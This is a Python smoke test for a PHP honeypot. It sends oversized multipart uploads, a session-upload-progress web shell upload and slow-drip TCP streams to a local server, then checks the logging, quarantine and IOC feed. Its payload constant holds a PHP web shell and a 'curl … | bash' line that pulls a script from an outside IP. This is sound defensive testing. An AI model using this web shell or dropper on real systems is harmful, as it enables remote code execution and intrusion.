#!/usr/bin/env python3
"""End-to-end smoke test for the PHP2Shell honeypot.

Runs the real server on a loopback port, sends benign and hostile traffic
(including a deliberately paused TCP stream), then verifies that:

  * Apache/PHP headers and decoy routes are served
  * CVE-2026-109618 and CVE-2026-109619 signatures are logged
  * uploaded payloads are quarantined under SHA-256 filenames
  * the IOC feed is updated

Only the Python standard library is used.
"""

from __future__ import annotations

import hashlib
import http.client
import json
import os
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import time
import traceback
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
HOST = "127.0.0.1"
PORT = 18081
PAYLOAD = b"<?php system($_GET['c']); ?>\ncurl -s http://203.0.113.9/x.sh | bash\n"


def check(condition: bool, message: str) -> None:
    if not condition:
        raise AssertionError(message)


def multipart_body(parts: list[dict]) -> tuple[bytes, str]:
    boundary = "----php2shell" + os.urandom(8).hex()
    chunks: list[bytes] = []
    for part in parts:
        chunks.append(f"--{boundary}\r\n".encode())
        disposition = f'Content-Disposition: form-data; name="{part["name"]}"'
        if part.get("filename"):
            disposition += f'; filename="{part["filename"]}"'
        chunks.append((disposition + "\r\n").encode())
        if part.get("content_type"):
            chunks.append(f'Content-Type: {part["content_type"]}\r\n'.encode())
        chunks.append(b"\r\n")
        data = part["data"]
        chunks.append(data if isinstance(data, bytes) else data.encode())
        chunks.append(b"\r\n")
    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks), boundary


def http_request(
    method: str,
    path: str,
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 10.0,
) -> tuple[int, dict[str, str], bytes]:
    connection = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    connection.request(method, path, body=body, headers=headers or {})
    response = connection.getresponse()
    payload = response.read()
    result = (
        response.status,
        {name.lower(): value for name, value in response.getheaders()},
        payload,
    )
    connection.close()
    return result


def wait_ready(port: int = PORT, timeout: float = 20.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((HOST, port), timeout=0.5):
                return
        except OSError:
            time.sleep(0.1)
    raise RuntimeError("honeypot did not start listening in time")


def build_env(tmp: Path, **overrides: object) -> dict[str, str]:
    env = os.environ.copy()
    env.update(
        {
            "HONEYPOT_HTTP_PORT": str(PORT),
            "HONEYPOT_LOG_DIR": str(tmp / "logs"),
            "HONEYPOT_PAYLOAD_DIR": str(tmp / "payloads"),
            "HONEYPOT_TMP_DIR": str(tmp / "tmp"),
            "HONEYPOT_LARGE_MULTIPART_BYTES": "2048",
            "HONEYPOT_MANY_PARTS": "4",
            "HONEYPOT_PART_HEADER_BYTES": "256",
            "HONEYPOT_SLOW_GAP_SECONDS": "0.2",
            "HONEYPOT_SLOW_TOTAL_SECONDS": "0.6",
            "HONEYPOT_BODY_TIMEOUT_SECONDS": "1.5",
            "HONEYPOT_MAX_ARTIFACT_BYTES": "1048576",
            "HONEYPOT_MAX_ARTIFACT_PARTS": "8",
            "HONEYPOT_LOG_LEVEL": "INFO",
        }
    )
    env.update({key: str(value) for key, value in overrides.items()})
    return env


def start_server(
    env: dict[str, str], workdir: Path, name: str = "server"
) -> tuple[subprocess.Popen, Path]:
    log_path = workdir / f"{name}.log"
    handle = log_path.open("wb")
    process = subprocess.Popen(
        [sys.executable, str(ROOT / "main.py")],
        cwd=str(ROOT),
        env=env,
        stdout=handle,
        stderr=subprocess.STDOUT,
    )
    return process, log_path


def stop_server(process: subprocess.Popen, log_path: Path) -> None:
    process.terminate()
    try:
        process.wait(timeout=10)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait(timeout=5)
    if process.returncode not in (0, -15):
        print(f"server exited with {process.returncode}; log follows:", file=sys.stderr)
        print(log_path.read_text(errors="replace")[-4000:], file=sys.stderr)


def run_checks(tmp: Path, env: dict[str, str]) -> None:
    log_path = tmp / "logs" / "exploits.json"
    payload_dir = tmp / "payloads"
    ioc_path = tmp / "logs" / "iocs.txt"
    manifest_path = payload_dir / "manifest.jsonl"

    # ---------------------------------------------------------------- #
    # 1. Decoy surface + Apache/PHP fingerprints
    # ---------------------------------------------------------------- #
    status, headers, body = http_request("GET", "/")
    check(status == 200, f"GET / returned {status}")
    check(headers.get("server") == "Apache/2.4.52 (Ubuntu)", headers.get("server"))
    check(headers.get("x-powered-by") == "PHP/8.1.2", headers.get("x-powered-by"))
    check(b"Intranet File Portal" in body, "decoy index body missing")

    status, _, body = http_request("GET", "/phpinfo.php")
    check(status == 200, f"GET /phpinfo.php returned {status}")
    check(b"session.upload_progress.enabled" in body, "phpinfo decoy missing session settings")

    status, _, body = http_request("GET", "/no-such-page")
    check(status == 404, f"unknown route returned {status}")
    check(b"Not Found" in body, "Apache-style 404 page missing")

    status, headers, body = http_request("HEAD", "/")
    check(status == 200, f"HEAD / returned {status}")
    check(body == b"", "HEAD response included a body")
    check(int(headers.get("content-length", "0")) > 0, "HEAD response missing Content-Length")

    status, headers, _ = http_request("OPTIONS", "/upload.php")
    check(status == 200, f"OPTIONS returned {status}")
    check("POST" in headers.get("allow", ""), "OPTIONS missing Allow methods")

    status, _, body = http_request("GET", "/healthz")
    check(status == 200 and b'"ok"' in body, "health endpoint failed")

    status, _, _ = http_request(
        "POST",
        "/upload.php",
        b"name=quarterly-report&note=benign",
        {"Content-Type": "application/x-www-form-urlencoded"},
    )
    check(status == 200, f"benign urlencoded upload returned {status}")

    status, _, _ = http_request(
        "PUT",
        "/upload.php",
        b"name=quarterly-report&note=benign-put",
        {"Content-Type": "application/x-www-form-urlencoded"},
    )
    check(status == 200, f"PUT upload returned {status}")

    # ---------------------------------------------------------------- #
    # 2. CVE-2026-109618: oversized / mangled multipart OOM bait
    # ---------------------------------------------------------------- #
    big_parts = [{"name": f"field{i}", "data": "A" * 600} for i in range(6)]
    big_parts.append(
        {
            "name": "file",
            "filename": "A" * 300 + ".php",
            "content_type": "application/x-php",
            "data": b"<?php echo 'x'; ?>" + b"B" * 4096,
        }
    )
    big_body, big_boundary = multipart_body(big_parts)
    status, _, response_body = http_request(
        "POST",
        "/upload.php",
        big_body,
        {
            "Content-Type": f"multipart/form-data; boundary={big_boundary}",
            "User-Agent": "python-requests/2.31.0",
        },
    )
    check(status == 500, f"CVE-2026-109618 upload returned {status}")
    check(b"Allowed memory size" in response_body, "PHP OOM fatal error page missing")

    big_record = wait_for_record(
        log_path,
        lambda record: record["request"]["path"] == "/upload.php"
        and record["body"]["bytes"] == len(big_body),
    )
    check(big_record is not None, "CVE-2026-109618 request was not logged")
    assert big_record is not None
    check("CVE-2026-109618" in big_record["analysis"]["cves"], "109618 not attributed")
    check(
        big_record["response"]["status"] == 500,
        "logged status does not match simulated PHP fatal error",
    )
    big_signals = signal_ids(big_record)
    for expected in (
        "large_multipart_upload",
        "excessive_multipart_parts",
        "oversized_upload_filename",
        "oversized_part_headers",
    ):
        check(expected in big_signals, f"missing 109618 signal {expected}: {big_signals}")

    # ---------------------------------------------------------------- #
    # 3. CVE-2026-109619: PHP_SESSION_UPLOAD_PROGRESS webshell race
    # ---------------------------------------------------------------- #
    session_body, session_boundary = multipart_body(
        [
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "racewindow"},
            {
                "name": "file",
                "filename": "shell.php",
                "content_type": "application/x-php",
                "data": PAYLOAD,
            },
        ]
    )
    status, _, _ = http_request(
        "POST",
        "/upload.php",
        session_body,
        {
            "Content-Type": f"multipart/form-data; boundary={session_boundary}",
            "User-Agent": "Mozilla/5.0",
        },
    )
    check(status == 200, f"CVE-2026-109619 upload returned {status}")

    session_record = wait_for_record(
        log_path,
        lambda record: record["request"]["path"] == "/upload.php"
        and record["body"]["bytes"] == len(session_body),
    )
    check(session_record is not None, "CVE-2026-109619 request was not logged")
    assert session_record is not None
    check("CVE-2026-109619" in session_record["analysis"]["cves"], "109619 not attributed")
    session_signals = signal_ids(session_record)
    for expected in ("php_session_upload_progress", "webshell_upload", "command_dropper"):
        check(expected in session_signals, f"missing 109619 signal {expected}: {session_signals}")
    tools = {dropper["tool"] for dropper in session_record["analysis"]["command_droppers"]}
    check("curl" in tools, f"curl dropper not extracted: {tools}")
    check(
        "127.0.0.1" in session_record["analysis"]["iocs"].get("ip", []),
        "attacker IP not recorded as IOC",
    )

    # ---------------------------------------------------------------- #
    # 4. CVE-2026-109619: malicious TCP stream pauses
    # ---------------------------------------------------------------- #
    drip_body, drip_boundary = multipart_body([{"name": "note", "data": "slow"}])
    raw_response = slow_drip(drip_body, drip_boundary)
    check(raw_response.startswith(b"HTTP/1.1 200"), raw_response[:200])
    drip_record = wait_for_record(
        log_path, lambda record: "tcp_stream_pause" in signal_ids(record)
    )
    check(drip_record is not None, "paused TCP stream was not recorded")
    assert drip_record is not None
    check("CVE-2026-109619" in drip_record["analysis"]["cves"], "109619 not attributed to pauses")
    check(
        drip_record["body"]["max_chunk_gap_seconds"] >= 0.2,
        f"chunk gap below threshold: {drip_record['body']['max_chunk_gap_seconds']}",
    )

    # ---------------------------------------------------------------- #
    # 5. Slowloris-style stalled upload is cut off safely
    # ---------------------------------------------------------------- #
    stalled_response = stalled_upload()
    check(stalled_response.startswith(b"HTTP/1.1 408"), stalled_response[:200])
    timeout_record = wait_for_record(
        log_path, lambda record: "body_read_timeout" in signal_ids(record)
    )
    check(timeout_record is not None, "stalled upload timeout was not recorded")
    assert timeout_record is not None
    check(timeout_record["body"]["timed_out"] is True, "timed_out flag missing")
    check(
        "CVE-2026-109619" in timeout_record["analysis"]["cves"],
        "109619 not attributed to stalled body",
    )

    # ---------------------------------------------------------------- #
    # 6. Quarantined artifacts use SHA-256 filenames and exact bytes
    # ---------------------------------------------------------------- #
    payload_hash = hashlib.sha256(PAYLOAD).hexdigest()
    payload_file = payload_dir / f"{payload_hash}.php"
    check(payload_file.exists(), f"quarantined payload missing: {payload_file.name}")
    check(payload_file.read_bytes() == PAYLOAD, "quarantined payload bytes changed")
    check(len(payload_file.stem) == 64, "payload filename is not a SHA-256 digest")

    body_hash = hashlib.sha256(session_body).hexdigest()
    body_file = payload_dir / f"{body_hash}.multipart"
    check(body_file.exists(), f"raw request body missing: {body_file.name}")
    check(body_file.read_bytes() == session_body, "raw request body bytes changed")

    manifest_entries = [
        json.loads(line)
        for line in manifest_path.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]
    check(len(manifest_entries) >= 2, "payload manifest is empty")
    check(
        any(entry["sha256"] == payload_hash for entry in manifest_entries),
        "payload hash missing from manifest",
    )
    check(
        all(set(("sha256", "file", "kind", "first_seen", "request_id")) <= set(entry) for entry in manifest_entries),
        "manifest entry missing required fields",
    )

    # ---------------------------------------------------------------- #
    # 7. IOC feed / blocklist
    # ---------------------------------------------------------------- #
    ioc_entries = [
        line.split("\t")
        for line in ioc_path.read_text(encoding="utf-8").splitlines()
        if line and not line.startswith("#")
    ]
    check(
        any(entry[0] == "ip" and entry[1] == "127.0.0.1" for entry in ioc_entries),
        "attacker IP missing from IOC feed",
    )
    check(
        any(entry[0] == "sha256" and entry[1] == payload_hash for entry in ioc_entries),
        "payload hash missing from IOC feed",
    )
    check(
        any(entry[0] == "filename" and entry[1] == "shell.php" for entry in ioc_entries),
        "uploaded filename missing from IOC feed",
    )
    blocklist = {entry[1] for entry in ioc_entries if entry[0] == "ip"}
    check("127.0.0.1" in blocklist, "IP blocklist extraction failed")

    # ---------------------------------------------------------------- #
    # 8. Structured log integrity
    # ---------------------------------------------------------------- #
    records = load_records(log_path)
    check(len(records) >= 6, f"too few telemetry records: {len(records)}")
    check(
        all(record["request_id"] and record["timestamp"] for record in records),
        "telemetry record missing request id or timestamp",
    )
    check(
        all(record["client"]["ip"] == "127.0.0.1" for record in records),
        "client IP not captured",
    )
    check(
        sum(1 for record in records if record["analysis"]["is_exploit"]) >= 4,
        "exploit verdicts missing from telemetry",
    )
    check(
        any(
            header[0].lower() == "user-agent" and "python-requests" in header[1]
            for record in records
            for header in record["request"]["headers"]
        ),
        "raw request headers not captured",
    )


def run_tls_check(tmp: Path) -> None:
    if not shutil.which("openssl"):
        print("SKIP: TLS check (openssl not installed)")
        return
    tls_dir = tmp / "tls"
    tls_dir.mkdir(parents=True, exist_ok=True)
    cert_file = tls_dir / "honeypot.crt"
    key_file = tls_dir / "honeypot.key"
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-nodes",
            "-newkey",
            "rsa:2048",
            "-days",
            "1",
            "-keyout",
            str(key_file),
            "-out",
            str(cert_file),
            "-subj",
            "/CN=localhost",
        ],
        check=True,
        capture_output=True,
    )

    tls_port = PORT + 1
    plain_port = PORT + 2
    env = build_env(
        tmp / "tls",
        HONEYPOT_HTTP_PORT=plain_port,
        HONEYPOT_HTTPS_PORT=tls_port,
        HONEYPOT_TLS="true",
        HONEYPOT_CERT_FILE=str(cert_file),
        HONEYPOT_KEY_FILE=str(key_file),
    )
    process, log_path = start_server(env, tmp, "tls-server")
    try:
        wait_ready(tls_port)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        connection = http.client.HTTPSConnection(
            HOST, tls_port, timeout=10, context=context
        )
        connection.request("GET", "/")
        response = connection.getresponse()
        body = response.read()
        check(response.status == 200, f"TLS GET / returned {response.status}")
        check(
            response.getheader("Server") == "Apache/2.4.52 (Ubuntu)",
            "TLS listener missing Apache fingerprint",
        )
        check(b"Intranet File Portal" in body, "TLS decoy body missing")
        connection.close()
    finally:
        stop_server(process, log_path)


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="php2shell-honeypot-test-"))
    env = build_env(tmp)
    process, log_path = start_server(env, tmp)
    try:
        wait_ready()
        run_checks(tmp, env)
        run_tls_check(tmp)
    except Exception:
        traceback.print_exc()
        if log_path.exists():
            print("\n--- honeypot log ---", file=sys.stderr)
            print(log_path.read_text(errors="replace")[-6000:], file=sys.stderr)
        if os.environ.get("HONEYPOT_TEST_KEEP"):
            print(f"test artifacts kept at {tmp}", file=sys.stderr)
            tmp = Path("/nonexistent")  # skip cleanup
        return 1
    finally:
        stop_server(process, log_path)
        if tmp.exists():
            shutil.rmtree(tmp, ignore_errors=True)

    print("PASS: decoy routes, Apache/PHP headers, CVE-2026-109618, CVE-2026-109619,")
    print("      paused TCP stream detection, stalled-upload timeout, payload quarantine,")
    print("      SHA-256 manifest, IOC blocklist and TLS listener all verified.")
    return 0





def load_records(log_path: Path) -> list[dict]:
    if not log_path.exists():
        return []
    records = []
    for line in log_path.read_text(encoding="utf-8").splitlines():
        if line.strip():
            records.append(json.loads(line))
    return records


def wait_for_record(log_path: Path, predicate, timeout: float = 8.0) -> dict | None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        for record in load_records(log_path):
            if predicate(record):
                return record
        time.sleep(0.1)
    return None


def signal_ids(record: dict) -> list[str]:
    return [signal["id"] for signal in record["analysis"]["signals"]]


def slow_drip(body: bytes, boundary: str, pauses: float = 0.25) -> bytes:
    connection = socket.create_connection((HOST, PORT), timeout=20.0)
    headers = (
        f"POST /upload.php HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    connection.sendall(headers)
    step = max(1, len(body) // 5)
    for offset in range(0, len(body), step):
        connection.sendall(body[offset : offset + step])
        if offset + step < len(body):
            time.sleep(pauses)
    received = b""
    while True:
        chunk = connection.recv(65536)
        if not chunk:
            break
        received += chunk
    connection.close()
    return received


def stalled_upload(timeout: float = 0.0) -> bytes:
    """Announce a body, then never send it: exercises the read timeout."""
    connection = socket.create_connection((HOST, PORT), timeout=10.0)
    connection.sendall(
        (
            f"POST /upload.php HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 128\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    )
    if timeout:
        time.sleep(timeout)
    received = b""
    while True:
        chunk = connection.recv(65536)
        if not chunk:
            break
        received += chunk
    connection.close()
    return received


if __name__ == "__main__":
    raise SystemExit(main())

